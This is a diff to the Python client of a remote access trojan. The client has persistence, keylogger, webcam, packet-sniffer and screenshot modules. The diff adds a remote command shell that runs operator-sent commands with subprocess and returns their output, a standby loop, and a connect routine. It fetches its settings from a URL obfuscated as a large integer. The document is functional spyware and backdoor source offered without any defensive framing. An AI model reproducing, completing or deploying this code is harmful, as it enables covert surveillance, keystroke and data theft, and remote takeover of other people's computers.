@@ -739,32 +739,27 @@ class Client(object):
         cx.update({ fx.func_name : fx })
         return fx
 
-    def modules(fx, mx=__modules__):
+    def module(fx, mx=__modules__):
         if fx.func_name is 'persistence':
             fx.platforms = ['win32','darwin']
             fx.options = {'methods': ['registry key', 'scheduled task', 'wmi object', 'startup file', 'hidden file'] if os.name is 'nt' else ['launch agent', 'hidden file']}
-
         elif fx.func_name is 'keylogger':
             fx.platforms = ['win32','darwin','linux2']
             fx.options = {'max_bytes': 1024, 'next_upload': time.time() + 300.0, 'buffer': bytes(), 'window': None}
-            
         elif fx.func_name is 'webcam':
             fx.platforms = ['win32']
             fx.options = {'image': True, 'video': False}
-                        
         elif fx.func_name is 'packetsniffer':
             fx.platforms = ['darwin','linux2']
             fx.options  = { 'next_upload': time.time() + 300.0, 'buffer': []}
-            
         elif fx.func_name is 'screenshot':
             fx.platforms = ['win32','linux2','darwin']
             fx.options = {}
-            
         fx.status = True if sys.platform in fx.platforms else False
         mx.update({fx.func_name: fx})
         return fx
 
-    @modules
+    @module
     def persistence(self):
         for method in self.persistence.options['methods']:
             if method not in self.result['persistence']:
@@ -773,7 +768,7 @@ class Client(object):
         _ = self.threads.pop('persistence', None)
         return result
 
-    @modules
+    @module
     def screenshot(self):
         tmp = mktemp(suffix='.png')
         with mss() as screen:
@@ -783,7 +778,7 @@ class Client(object):
         _ =  self.threads.pop('screenshot', None)
         return result
 
-    @modules
+    @module
     def keylogger(self):
         if 'keylogger' in self.threads:
             if not self.threads['keylogger'].is_alive():
@@ -801,7 +796,7 @@ class Client(object):
         _ = self.threads.pop('keylogger', None)
         return result
 
-    @modules
+    @module
     def webcam(self):
         if self.webcam.options['image']:
             result = self.webcam_image()
@@ -811,7 +806,7 @@ class Client(object):
         _ = self.threads.pop('webcam', None)
         return result
 
-    @modules
+    @module
     def packetsniffer(self):
         if 'packetsniffer' not in self.threads:
             try:
@@ -824,6 +819,61 @@ class Client(object):
         self.result['packetsniffer'].update({ time.ctime() : result })
         _ = self.threads.pop('packetsniffer', None)
         return result
+
+    @command
+    def run_modules(self):
+        mods = [self.jobs.update({ mod : Thread(target=getattr(self, mod), name=mod)}) for mod in __modules__ if __modules__[mod].status if sys.platform in __modules__[mod].platforms if mod not in self.jobs]
+        for module in mods:
+            self.jobs[module].start()
+        if not self.mode:
+            return "Tasks complete."
+
+    @command
+    def shell(self):
+        while True:
+            if self.mode:
+                break
+            prompt = "[%d @ {}]> ".format(os.getcwd())
+            self._send(prompt, method='prompt')   
+            data = self._receive()
+            cmd, _, action = data.partition(' ')
+            if cmd in __command__:
+                result = __command__[cmd](action) if len(action) else __command__[cmd]()
+            else:
+                result = bytes().join(subprocess.Popen(data, 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
+            if result and len(result):
+                result = '\n' + str(result) + '\n'
+                self._send(result, method=cmd)
+
+    @command
+    def standby(self):
+        self.standby.next_run = time.time() + 300
+        while True:
+            if self.mode:
+                if time.time() > self.standby.next_run:
+                    self.run()
+                time.sleep(1)
+                b = self._receive()
+                self.mode = 0 if b else 1
+            else:
+                break
+        return self.shell()
+    
+    @command
+    def start(self):
+        try:
+            self.socket = self._connect(host=self._target(o=self.a, p=self.b))
+            self.dhkey  = self._diffiehellman()
+            while True:
+                if self.exit:
+                    break
+                elif self.mode:
+                    self.standby()
+                else:
+                    self.shell()
+        except Exception as e:
+            if self.v:
+                print "Error: '{}'".format(str(e))
 
     @command
     def cd(self, pathname): return os.chdir(pathname) if os.path.isdir(pathname) else os.chdir('.')
@@ -860,7 +910,10 @@ class Client(object):
 
     @command
     def results(self): return self._show(self.result)
-    
+
+    @command
+    def selfdestruct(self): return self.self_destruct()
+
     @command
     def modules(self): return '\n'.join([mod for mod in self.mods])
 
@@ -879,18 +932,12 @@ class Client(object):
     @command    
     def status(self): return '%d days, %d hours, %d minutes, %d seconds' % (int(time.clock()/86400.0), int((time.clock()%86400.0)/3600.0), int((time.clock()%3600.0)/60.0), int(time.clock()%60.0))
 
-    @command
-    def selfdestruct(self): return self.self_destruct()
-
-
 # ----------------- MAIN --------------------------
 
 def main(*args, **kwargs):
     client = Client(**kwargs)
-    try:
-        return client.start()
-    except:
-        return client
+    return client.start()
+
 
 if __name__ == '__main__':
     main(**request('GET', long_to_bytes(5470747107932334458705795873644192921028812319303193380834544015345122676822127713401432358267585150179895187289149303354507696196179451046593579441155950)).json()['settings'])
